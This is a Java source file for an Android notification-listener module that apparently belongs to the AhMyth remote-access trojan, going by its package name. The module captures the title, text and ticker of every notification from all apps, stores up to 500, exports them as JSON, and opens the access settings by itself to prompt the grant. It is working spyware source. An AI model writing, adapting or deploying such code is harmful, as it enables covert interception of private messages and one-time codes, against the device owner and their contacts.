package ahmyth.mine.king.ahmyth;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * NotificationReader captures all device notifications
 * Must be enabled in Settings > Notification Access
 */
public class NotificationReader extends NotificationListenerService {
    private static final String TAG = "NotificationReader";
    private static final int MAX_NOTIFICATIONS = 500;
    
    private static NotificationReader instance;
    private static List<NotificationEntry> notificationHistory = new ArrayList<>();
    private static boolean isEnabled = false;
    private static Context appContext;
    
    public static NotificationReader getInstance() {
        return instance;
    }
    
    public static void setContext(Context context) {
        appContext = context.getApplicationContext();
    }
    
    public static boolean isServiceEnabled() {
        return isEnabled && instance != null;
    }
    
    /**
     * Check if notification listener is enabled in settings
     */
    public static boolean isNotificationAccessEnabled(Context context) {
        if (context == null) return false;
        
        String pkgName = context.getPackageName();
        final String flat = Settings.Secure.getString(context.getContentResolver(),
                "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && TextUtils.equals(pkgName, cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }
    
    /**
     * Open notification access settings
     */
    public static void openNotificationAccessSettings(Context context) {
        if (context == null) return;
        
        try {
            Intent intent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            } else {
                intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening notification settings", e);
        }
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        appContext = getApplicationContext();
        Log.d(TAG, "NotificationReader created");
    }
    
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        isEnabled = true;
        Log.d(TAG, "NotificationReader connected");
        
        // Get existing notifications
        try {
            StatusBarNotification[] activeNotifications = getActiveNotifications();
            if (activeNotifications != null) {
                for (StatusBarNotification sbn : activeNotifications) {
                    processNotification(sbn, "EXISTING");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting active notifications", e);
        }
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        processNotification(sbn, "POSTED");
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        processNotification(sbn, "REMOVED");
    }
    
    private void processNotification(StatusBarNotification sbn, String action) {
        if (sbn == null) return;
        
        try {
            NotificationEntry entry = new NotificationEntry();
            entry.action = action;
            entry.packageName = sbn.getPackageName();
            entry.postTime = sbn.getPostTime();
            entry.id = sbn.getId();
            entry.timestamp = System.currentTimeMillis();
            
            // Get app name
            try {
                PackageManager pm = getPackageManager();
                entry.appName = pm.getApplicationLabel(
                    pm.getApplicationInfo(sbn.getPackageName(), 0)
                ).toString();
            } catch (Exception e) {
                entry.appName = sbn.getPackageName();
            }
            
            Notification notification = sbn.getNotification();
            if (notification != null) {
                // Get notification extras
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    Bundle extras = notification.extras;
                    if (extras != null) {
                        CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
                        CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
                        CharSequence bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
                        CharSequence subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
                        
                        entry.title = title != null ? title.toString() : "";
                        entry.text = text != null ? text.toString() : "";
                        entry.bigText = bigText != null ? bigText.toString() : "";
                        entry.subText = subText != null ? subText.toString() : "";
                    }
                }
                
                entry.tickerText = notification.tickerText != null ? 
                    notification.tickerText.toString() : "";
                entry.category = notification.category;
            }
            
            synchronized (notificationHistory) {
                notificationHistory.add(entry);
                
                // Limit history size
                while (notificationHistory.size() > MAX_NOTIFICATIONS) {
                    notificationHistory.remove(0);
                }
            }
            
            Log.d(TAG, "Notification [" + action + "] from " + entry.appName + ": " + entry.title);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        isEnabled = false;
        Log.d(TAG, "NotificationReader destroyed");
    }
    
    /**
     * Get all captured notifications as JSON
     */
    public static JSONObject getNotifications() {
        JSONObject result = new JSONObject();
        JSONArray notificationsArray = new JSONArray();
        
        try {
            // Check if notification access is enabled
            boolean accessEnabled = appContext != null && isNotificationAccessEnabled(appContext);
            
            if (!accessEnabled && !isEnabled) {
                result.put("enabled", false);
                result.put("error", "Notification access not enabled. Please enable in Settings > Apps > Special access > Notification access");
                result.put("requiresSettings", true);
                
                // Try to open settings automatically
                if (appContext != null) {
                    openNotificationAccessSettings(appContext);
                    result.put("settingsOpened", true);
                }
                
                return result;
            }
            
            synchronized (notificationHistory) {
                for (NotificationEntry entry : notificationHistory) {
                    notificationsArray.put(entry.toJSON());
                }
            }
            
            result.put("enabled", isEnabled || accessEnabled);
            result.put("count", notificationsArray.length());
            result.put("notifications", notificationsArray);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notifications JSON", e);
        }
        
        return result;
    }
    
    /**
     * Get active notifications currently showing
     */
    public JSONObject getActiveNotificationsJSON() {
        JSONObject result = new JSONObject();
        JSONArray notificationsArray = new JSONArray();
        
        try {
            if (instance != null) {
                StatusBarNotification[] active = getActiveNotifications();
                if (active != null) {
                    for (StatusBarNotification sbn : active) {
                        JSONObject notif = new JSONObject();
                        notif.put("packageName", sbn.getPackageName());
                        notif.put("postTime", sbn.getPostTime());
                        notif.put("id", sbn.getId());
                        
                        // Get app name
                        try {
                            PackageManager pm = getPackageManager();
                            notif.put("appName", pm.getApplicationLabel(
                                pm.getApplicationInfo(sbn.getPackageName(), 0)
                            ).toString());
                        } catch (Exception e) {
                            notif.put("appName", sbn.getPackageName());
                        }
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                            Bundle extras = sbn.getNotification().extras;
                            if (extras != null) {
                                CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
                                CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
                                notif.put("title", title != null ? title.toString() : "");
                                notif.put("text", text != null ? text.toString() : "");
                            }
                        }
                        
                        notificationsArray.put(notif);
                    }
                }
            }
            
            result.put("count", notificationsArray.length());
            result.put("active", notificationsArray);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting active notifications", e);
        }
        
        return result;
    }
    
    /**
     * Clear notification history
     */
    public static void clearHistory() {
        synchronized (notificationHistory) {
            notificationHistory.clear();
        }
        Log.d(TAG, "Notification history cleared");
    }
    
    /**
     * Request notification access - opens settings
     */
    public static JSONObject requestAccess(Context context) {
        JSONObject result = new JSONObject();
        try {
            if (isNotificationAccessEnabled(context)) {
                result.put("enabled", true);
                result.put("message", "Notification access already enabled");
            } else {
                openNotificationAccessSettings(context);
                result.put("enabled", false);
                result.put("settingsOpened", true);
                result.put("message", "Please enable notification access for this app");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting access", e);
            try {
                result.put("error", e.getMessage());
            } catch (JSONException ignored) {}
        }
        return result;
    }
    
    /**
     * Inner class for notification entries
     */
    private static class NotificationEntry {
        String action;
        String packageName;
        String appName;
        String title;
        String text;
        String bigText;
        String subText;
        String tickerText;
        String category;
        long postTime;
        long timestamp;
        int id;
        
        JSONObject toJSON() {
            JSONObject obj = new JSONObject();
            try {
                obj.put("action", action);
                obj.put("packageName", packageName);
                obj.put("appName", appName);
                obj.put("title", title);
                obj.put("text", text);
                obj.put("bigText", bigText);
                obj.put("subText", subText);
                obj.put("tickerText", tickerText);
                obj.put("category", category);
                obj.put("postTime", postTime);
                obj.put("timestamp", timestamp);
                obj.put("id", id);
            } catch (JSONException e) {
                Log.e(TAG, "Error converting entry to JSON", e);
            }
            return obj;
        }
    }
}
